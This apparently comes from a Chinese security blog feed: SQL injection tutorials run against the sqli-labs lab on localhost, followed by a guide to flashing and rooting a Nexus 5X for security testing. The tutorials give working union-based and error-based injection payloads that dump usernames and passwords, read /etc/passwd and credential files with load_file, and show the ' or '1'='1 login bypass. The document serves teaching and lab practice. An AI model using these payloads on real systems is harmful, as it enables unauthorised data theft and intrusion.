<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=1&apos; and (select count(*) from information_schema.tables group by concat((select schema_name from information_schema.schemata limit 4,1),0x7e,floor(rand(0)*2)))--+  #查表</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql之union注入、报错注入/mysql-4.png" alt="mysql-4"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=1&apos; and (select count(*) from information_schema.tables group by concat((select concat(username,0x7e,password) from users limit 0,1),0x7e,floor(rand(0)*2)))--+  #查数据</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql之union注入、报错注入/mysql-5.png" alt="mysql-5"></p>
<p>发送到bp进行数据爆破</p>
<p><img src="//choge.top/2020/01/16/Mysql之union注入、报错注入/mysql-6.png" alt="mysql-6"></p>
<p>设置如下，根据数据库命名规则为A-Z,a-z,_,0-9选择合适的字典组合</p>
<p><img src="//choge.top/2020/01/16/Mysql之union注入、报错注入/mysql-7.png" alt="mysql-7"></p>
<p>选择匹配字符</p>
<p><img src="//choge.top/2020/01/16/Mysql之union注入、报错注入/mysql-9.png" alt="mysql-8"></p>
<p><img src="//choge.top/2020/01/16/Mysql之union注入、报错注入/mysql-10.png" alt="mysql-10"></p>
<p>进行爆破，成功爆破出数据</p>
<p><img src="//choge.top/2020/01/16/Mysql之union注入、报错注入/mysql-11.png" alt="mysql-11"></p>
<h4 id="extractvalue-1"><a href="#extractvalue-1" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select user()),0x7e)) #select user()处插入sql语句即可</span><br></pre></td></tr></table></figure>

<p><code>extractvalue(1,select user()))</code>时无法显示root，因XPATH格式认为root为正确XPATH格式</p>
<p><img src="//choge.top/2020/01/16/Mysql之union注入、报错注入/mysql-13.png" alt="mysql-13"></p>
<p>此时需要使用concat连接一个非XPATH格式的字符，如下图使用!进行连接</p>
<p><img src="//choge.top/2020/01/16/Mysql之union注入、报错注入/mysql-14.png" alt="mysql-14"></p>
<h4 id="updatexml-1"><a href="#updatexml-1" class="headerlink" title="updatexml()"></a>updatexml()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=1&apos; and updatexml(1,concat(0x7e,(select user())),1)--+  #查看当前用户</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql之union注入、报错注入/mysql-15.png" alt="mysql-15"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=1&apos; and updatexml(1,concat(0x7e,(select substr(password,1,2) from users limit 0,1)),1)--+  #显示字符受限时可采用substr和limit进行逐个字符显示</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql之union注入、报错注入/mysql-16.png" alt="mysql-16"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=1&apos; and updatexml(1,concat(0x7e,(select substr(password,3,4) from users limit 0,1)),1)--+  #显示字符受限时可采用substr和limit进行逐个字符显示</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql之union注入、报错注入/mysql-17.png" alt="mysql-17"></p>
]]></content>
      <categories>
        <category>Sql injection</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql注入基础</title>
    <url>/2020/01/16/Mysql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>本文主要讲解Mysql基础语法</p><h2 id="Mysql内置函数"><a href="#Mysql内置函数" class="headerlink" title="Mysql内置函数"></a>Mysql内置函数</h2><p><a href="https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.html</a></p><h2 id="Mysql常用函数"><a href="#Mysql常用函数" class="headerlink" title="Mysql常用函数"></a>Mysql常用函数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system_user() #系统用户名</span><br><span class="line">user() #用户名</span><br><span class="line">current_user() #当前用户名</span><br><span class="line">session_user() #连接数据库的用户名</span><br><span class="line">database() #数据库名</span><br><span class="line">version() #数据库版本，也可以使用@@version</span><br><span class="line">@@datadir #数据库路径</span><br><span class="line">@@basedir #数据库安装路径</span><br><span class="line">@@version_compile_os #操作系统</span><br><span class="line">count() #返回执行结果数量 select count(*) from users;</span><br><span class="line">concat() #没有分隔符地连接字符串</span><br><span class="line">concat_ws() #含有分隔符地连接字符串</span><br><span class="line">group_concat() #连接和一个组的所有字符串，并以逗号分隔每一条数据</span><br><span class="line">load_file() #读取本地文件</span><br><span class="line">into outfile #写文件</span><br><span class="line">ascii() #字符串的ASCII代码值</span><br><span class="line">ord() #返回字符串第一个字符的ASCII值</span><br><span class="line">mid()  #返回一个字符串的一部分</span><br><span class="line">substr()  #返回一个字符串的一部分</span><br><span class="line">length() #返回字符串的长度</span><br><span class="line">left() #返回字符串的最左边几个字符</span><br><span class="line">floor()  #返回小于或等于x的最大整数</span><br><span class="line">rand()  #返回0和1之间的一个随机数</span><br><span class="line">extractvalue()  #第一个参数：XMl document是String格式，为XMl文档对象的名称，中文为Doc，第二个参数：XPath string （Xpath格子的字符串）。作用：从目标XML中返回包含所查询的字符串</span><br><span class="line">updatexml()  #第一个参数：XML document是String格式，为XMl文档对象的名称，中文为Doc，第二个参数：XPath string （Xpath格子的字符串），第三个参数new value，String格式，替换查找到的符合条件的数据。作用：改变文档中符合条件的节点的值</span><br><span class="line">sleep()  #让此语句运行N秒钟</span><br><span class="line">if()  # &gt; SELECT IF(1&gt;2,2,3); &gt; 3</span><br><span class="line">char()  #返回整数ASCII代码字符组成的字符串</span><br><span class="line">STRCMP()  #比较字符串内容</span><br><span class="line">IFNULL()  #假如参数1不为NUll，则返回值为参数1，否则其返回值为参数2</span><br><span class="line">exp()  #返回e的x次方</span><br></pre></td></tr></table></figure><a id="more"></a>



<h3 id="部分函数测试"><a href="#部分函数测试" class="headerlink" title="部分函数测试"></a>部分函数测试</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">concat() #没有分隔符地连接字符串</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-1.png" alt="mysql-1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">concat_ws() #含有分隔符地连接字符串</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-2.png" alt="mysql-2"></p>
<p>可以使用16进制的形式来进行分隔</p>
<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-3.png" alt="mysql-3"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">group_concat() #连接和一个组的所有字符串，并以逗号分隔每一条数据</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-4.png" alt="mysql-4"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load_file() #读取本地文件</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-6.png" alt="mysql-6"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">into outfile #写文件</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-5.png" alt="mysql-5"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ascii() #字符串的ASCII代码值</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-7.png" alt="mysql-7"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ord() #返回字符串第一个字符的ASCII值</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-8.png" alt="mysql-8"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mid()  #返回一个字符串的一部分</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-9.png" alt="mysql-9"></p>
<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-10.png" alt="mysql-10"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">left() #返回字符串的最左边几个字符</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-11.png" alt="mysql-11"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">floor()  #返回小于或等于x的最大整数</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-12.png" alt="mysql-12"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if()  # &gt; SELECT IF(1&gt;2,2,3); -&gt; 3</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-13.png" alt="mysql-13"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">char()  #返回整数ASCII代码字符组成的字符串</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-14.png" alt="mysql-14"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">STRCMP()  #比较字符串内容</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-15.png" alt="mysql-15"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IFNULL()  #假如参数1不为NUll，则返回值为参数1，否则其返回值为参数2</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-16.png" alt="mysql-16"></p>
<h2 id="Mysql运算符"><a href="#Mysql运算符" class="headerlink" title="Mysql运算符"></a>Mysql运算符</h2><h3 id="算术运算符："><a href="#算术运算符：" class="headerlink" title="算术运算符："></a>算术运算符：</h3><table>
<thead>
<tr>
<th align="center">符号</th>
<th align="center">作用</th>
<th align="center">符号</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td align="center">加法运算</td>
<td align="center">%</td>
<td align="center">求余运算</td>
</tr>
<tr>
<td align="center">-</td>
<td align="center">减法运算</td>
<td align="center">DIV</td>
<td align="center">除法运算，同”/“</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">乘法运算</td>
<td align="center">MOD</td>
<td align="center">求余运算，同”%”</td>
</tr>
<tr>
<td align="center">/</td>
<td align="center">除法运算</td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<h3 id="比较运算符："><a href="#比较运算符：" class="headerlink" title="比较运算符："></a>比较运算符：</h3><table>
<thead>
<tr>
<th align="center">符号</th>
<th align="center">作用</th>
<th align="center">符号</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&gt;</td>
<td align="center">大于</td>
<td align="center">IS NOT NULL</td>
<td align="center">不为空</td>
</tr>
<tr>
<td align="center">&lt;</td>
<td align="center">小于</td>
<td align="center">BETWEEN AND</td>
<td align="center">在…之间</td>
</tr>
<tr>
<td align="center">=</td>
<td align="center">等于</td>
<td align="center">IN</td>
<td align="center">包含</td>
</tr>
<tr>
<td align="center">&gt;=</td>
<td align="center">大于等于</td>
<td align="center">NOT IN</td>
<td align="center">不包含</td>
</tr>
<tr>
<td align="center">&lt;=</td>
<td align="center">小于等于</td>
<td align="center">LIKE</td>
<td align="center">模式匹配</td>
</tr>
<tr>
<td align="center">!=或&lt;&gt;</td>
<td align="center">不等于</td>
<td align="center">NOT LIKE</td>
<td align="center">模式匹配</td>
</tr>
<tr>
<td align="center">IS NULL</td>
<td align="center">为空</td>
<td align="center">REGEXP</td>
<td align="center">正则表达式</td>
</tr>
</tbody></table>
<h3 id="逻辑运算符："><a href="#逻辑运算符：" class="headerlink" title="逻辑运算符："></a>逻辑运算符：</h3><table>
<thead>
<tr>
<th align="center">符号</th>
<th align="center">作用</th>
<th align="center">符号</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&amp;&amp;或AND</td>
<td align="center">与</td>
<td align="center">!或NOT</td>
<td align="center">非</td>
</tr>
<tr>
<td align="center">||或OR</td>
<td align="center">或</td>
<td align="center">XOR</td>
<td align="center">异或</td>
</tr>
</tbody></table>
<h3 id="部分运算符测试"><a href="#部分运算符测试" class="headerlink" title="部分运算符测试"></a>部分运算符测试</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">in #包含</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-18.png" alt="mysql-18"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">not in #不包含</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-19.png" alt="mysql-19"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">like #模式匹配</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-21.png" alt="mysql-21"></p>
<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-22.png" alt="mysql-22"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regexp #正则表达式</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-23.png" alt="mysql-23"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and #与</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-24.png" alt="mysql-24"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or #或</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-25.png" alt="mysql-25"></p>
<h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>登录框SQL语句：<code>select * from users where username=&#39;admin&#39; and pwd=&#39;pass&#39;;</code>使用万能密码<code>&#39; or &#39;1&#39;=&#39;1</code>同时输入用户名和密码处，和原SQL语句拼接形成的语句为<code>select * from users where username=&#39;&#39; or &#39;1&#39;=&#39;1&#39; and pwd=&#39;&#39; or &#39;1&#39;=&#39;1&#39;</code>，形成<code>username=&#39;&#39;</code>为假，拼接<code>or &#39;1&#39;=&#39;1&#39;</code>为真语句后``select * from users where username=’’ or ‘1’=’1’<code>为真，继续拼接</code>pwd=’’<code>为假语句后</code>select * from users where username=’’ or ‘1’=’1’ and pwd=’’<code>为假，最后拼接</code>or ‘1’=’1’<code>真语句后</code>select * from users where username=’’ or ‘1’=’1’ and pwd=’’ or ‘1’=’1’`恒为真，成功登录。</p>
<h2 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h2><p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-26.png" alt="mysql-26"></p>
<h3 id="MySQL内置库（-gt-5-7）"><a href="#MySQL内置库（-gt-5-7）" class="headerlink" title="MySQL内置库（&gt;=5.7）:"></a>MySQL内置库（&gt;=5.7）:</h3><p>mysql：保存有账户信息，权限信息，储存过程，event，时区等信息。</p>
<p>sys：包含了一系列的存储过程、自定义函数以及视图来帮助我们快速的了解系统的元数据信息。（元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等）</p>
<p>performance_schema：用于收集数据库服务器性能参数</p>
<p>information_schema：它提供了访问数据库元数据的方式。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库表，表的数据类型和访问权限。</p>
<h3 id="查询语句核心语法"><a href="#查询语句核心语法" class="headerlink" title="查询语句核心语法"></a>查询语句核心语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select schema_name from information_schema.schemata  #查库</span><br><span class="line">select table_name from information_schema.tables where table_schema=库名  #查表</span><br><span class="line">select column_name from information_schema.columns where table_name=表名  #查列</span><br><span class="line">select 列名 from 库名.表名  #查数据</span><br></pre></td></tr></table></figure>

<h3 id="部分查询语句测试"><a href="#部分查询语句测试" class="headerlink" title="部分查询语句测试"></a>部分查询语句测试</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select schema_name from information_schema.schemata  #查库</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-27.png" alt="mysql-27"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select table_name from information_schema.tables table_schema=&apos;security&apos;  #查表</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-28.png" alt="mysql-28"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&apos;users&apos;  #查列</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-29.png" alt="mysql-29"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=0x7573657273  #可以使用16进制的形式进行查询</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-30.png" alt="mysql-30"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select uesrname,password from security.users  #查询数据</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-31.png" alt="mysql-31"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select uesrname,password from security.users limit 0，1  #当显示位不能显示多个数据时可以使用limit逐个显示</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-32.png" alt="mysql-32"></p>
<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-33.png" alt="mysql-33"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(schema_name) from information_schema.schemata  #当显示位不能显示多个数据可使用group_concat进行多个数据显示</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-34.png" alt="mysql-34"></p>
<h3 id="SQL注入实战"><a href="#SQL注入实战" class="headerlink" title="SQL注入实战"></a>SQL注入实战</h3><p>使用sqli_lab第一关作为测试环境</p>
<h4 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h4><p><code>&#39; and &#39;1&#39;=&#39;1</code>显示正确</p>
<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-36.png" alt="mysql-36"></p>
<p><code>&#39; and &#39;1&#39;=&#39;2</code>显示错误，判断存在注入</p>
<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-37.png" alt="mysql-37"></p>
<p><code>order by 3</code>显示正确</p>
<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-38.png" alt="mysql-38"></p>
<p><code>order by 4</code>显示错误，判断为3列</p>
<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-39.png" alt="mysql-39"></p>
<p><code>-1&#39; union select 1,2,3 --+</code>查看显示位，-1为了前面数据不进行显示，显示1，2，3之中的数据</p>
<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-40.png" alt="mysql-40"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select schema_name from information_schema.schemata) --+  ##查看数据库</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-41.png" alt="mysql-41"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select schema_name from information_schema.schemata limit 0,1) --+  #显示位不足，使用limit查看数据</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-42.png" alt="mysql-42"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)--+  #显示位不足，使用group_concat查看数据</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-43.png" alt="mysql-43"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479)--+ #16进制</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-44.png" alt="mysql-44"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;)--+ #查看表</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-47.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select group_concat(username) from security.users)--+  #查看数据</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-48.png" alt="mysql-46"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select group_concat(username,password) from security.users)--+ #查看数据</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-49.png" alt="mysql-49"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select group_concat(username,0x7e,password) from security.users)--+  #加入0x7e友好显示</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-50.png" alt="mysql-50"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select concat_ws(0x7e,username,password) from security.users limit 0,1)—-+ #limit逐条显示</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-51.png" alt="mysql-51"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select user())--+ #查看当前用户</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-52.png" alt="mysql-52"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select database())--+  #查看当前数据库</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-53.png" alt="mysql-53"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select load_file(&apos;var/www/html/sql-connections/db-creds.inc&apos;))--+  #读取文件</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-54.png" alt="mysql-54"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select load_file(&apos;/var/www/html/Less-1/index.php&apos;))--+  #读取文件，php代码需要右键查看源代码</span><br><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select load_file(0x2f7661722f7777772f68746d6c2f4c6573732d312f696e6465782e706870))--+  #16进制方式读取文件</span><br></pre></td></tr></table></figure>

<p><em>注：</em>路径符号<code>\</code>错误，<code>\\</code>正确，<code>/</code>正确，转换16进制就不需要<code>&#39;&#39;</code></p>
<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-55.png" alt="mysql-55"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select load_file(&apos;/etc/passwd&apos;))--+  #读取文件</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-56.png" alt="mysql-56"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select &apos;123&apos; into outfile &apos;/var/www/1.php&apos;)--+  #写入文件，路径可以使用16机制，由于权限原因，此处无法写入</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-57.png" alt="mysql-57"></p>
]]></content>
      <categories>
        <category>Sql injection</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Android安全之刷机</title>
    <url>/2020/01/02/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E5%88%B7%E6%9C%BA/</url>
    <content><![CDATA[<p>记录一次Nexus5x刷机过程</p><p>刷机前需要在电脑安装adb环境和Android手机开启usb调试，十分简单，百度即可。</p><h2 id="刷机包选择"><a href="#刷机包选择" class="headerlink" title="刷机包选择"></a>刷机包选择</h2><p>刷机包选择与手机型号匹配的最新系统，如此次刷机的机子为Nexus5x，选择官方最新包为Android 8.10。最新能刷上的包一般兼容性较好，有利于安全测试。现阶段Android 6.0以下版本逐渐对app开发不够好，Android 6.0还能勉强支持。</p><a id="more"></a>


<p>Nexus5x最新安装包连接<a href="https://dl.google.com/dl/android/aosp/bullhead-opm7.181205.001-factory-5f189d84.zip" target="_blank" rel="noopener">https://dl.google.com/dl/android/aosp/bullhead-opm7.181205.001-factory-5f189d84.zip</a></p>
<p>Nexus5最新安装包连接<a href="https://dl.google.com/dl/android/aosp/hammerhead-m4b30z-factory-625c027b.zip" target="_blank" rel="noopener">https://dl.google.com/dl/android/aosp/hammerhead-m4b30z-factory-625c027b.zip</a></p>
<h2 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h2><p>在配置好adb环境并手机开启usb情况下，连接usb，执行<code>db reboot bootloader</code>进入bootloader，或关机状态同时按住“音量减”和“电源”直到手机开机，进入 bootloader。</p>
<p>刷机前需要确认手机已解锁，解锁的手机开机时会有解锁的图标，若是上锁的图标则需在bootloader模式先解锁，解锁命令<code>fastboot oem unlock</code></p>
<p>将下载的压缩包解压，如下</p>
<p><img src="//choge.top/2020/01/02/Android安全之刷机/sj-1.png" alt="sj-1"></p>
<p>mac或者linux下赋予flash-all.sh执行权限后执行<code>./flahs-all.sh</code>，Windows下直接执行bat文件，Windows有时会出现无法刷入情况，需要将各个包手动刷入，进入zip包后使用fastboot刷入。如上图先刷入bootloader和radio，命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fastboot flash bootloader bootloader-bullhead-bhz32c.img  #刷入bootloader-bullhead-bhz32c.img</span><br><span class="line">fastboot flash radio radio-bullhead-m8994f-2.6.42.5.03.img  #刷入radio-bullhead-m8994f-2.6.42.5.03.img</span><br></pre></td></tr></table></figure>

<p>进入image-bullhead-opm7.181205.001.zip解压目录，刷入系统内核等</p>
<p><img src="//choge.top/2020/01/02/Android安全之刷机/sj-2.png" alt="sj-2"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fastboot reboot-bootloader  #重启bootloader</span><br><span class="line">fastboot flash recovery recovery.img  #刷入recovery.img</span><br><span class="line">fastboot flash boot boot.img  #刷入boot.img</span><br><span class="line">fastboot flash system system.img  #刷入system.img</span><br><span class="line">fastboot flash vendor vendor.img  #刷入vendor.img</span><br><span class="line">fastboot reboot  #重启手机</span><br></pre></td></tr></table></figure>

<h2 id="刷入第三方recovery"><a href="#刷入第三方recovery" class="headerlink" title="刷入第三方recovery"></a>刷入第三方recovery</h2><p>进入<a href="https://dl.twrp.me/网站寻找对应机型的第三方recovery，一般选最新版本。" target="_blank" rel="noopener">https://dl.twrp.me/网站寻找对应机型的第三方recovery，一般选最新版本。</a></p>
<p>进入下载下载下来的第三方recovery目录，刷入第三方recovery，<code>fastboot flash recovery 第三方recovery包名称</code></p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>进入<a href="https://autoroot.chainfire.eu/网站找对应手机root刷机包，下载后解压如下" target="_blank" rel="noopener">https://autoroot.chainfire.eu/网站找对应手机root刷机包，下载后解压如下</a></p>
<p><img src="//choge.top/2020/01/02/Android安全之刷机/sj-3.png" alt="sj-3"></p>
<p>本机为mac，<code>chmod +x root-mac.sh</code>赋予执行权限，手机进入bootloader模式，mac执行<code>/root-mac.sh</code>进行刷入，此方法经过测试一般会成功，此时可以通过第三方recovery刷入通用root包：</p>
<p><a href="https://download.chainfire.eu/1220/SuperSU/SR5-SuperSU-v2.82-SR5-20171001224502.zip" target="_blank" rel="noopener">https://download.chainfire.eu/1220/SuperSU/SR5-SuperSU-v2.82-SR5-20171001224502.zip</a> </p>
<p>将下载的包导入手机，随后重启进入bootloader，按音量键选择进入recovery，进入recovery后进入install功能找到导入的root包，进行刷入。由于此方法刷入会替换内核，不是十分推荐。Android8以上系统可以使用Magisk替代SuperSU进行root，Nexus5x可使用此root包：</p>
<p><a href="https://github.com/topjohnwu/Magisk/releases/download/v16.7/Magisk-v16.7.zip" target="_blank" rel="noopener">https://github.com/topjohnwu/Magisk/releases/download/v16.7/Magisk-v16.7.zip</a> </p>
<p>下载后导入手机通过第三方recovery刷入成功。</p>
<h2 id="安装Xposed框架和证书绕过"><a href="#安装Xposed框架和证书绕过" class="headerlink" title="安装Xposed框架和证书绕过"></a>安装Xposed框架和证书绕过</h2><p>本人喜欢下载酷安应用市场然后进行Xposed框架安装（输入框架时需要科学上网），也可以直接安装。</p>
<p><a href="http://repo.xposed.info/module/de.robv.android.xposed.installer" target="_blank" rel="noopener">http://repo.xposed.info/module/de.robv.android.xposed.installer</a></p>
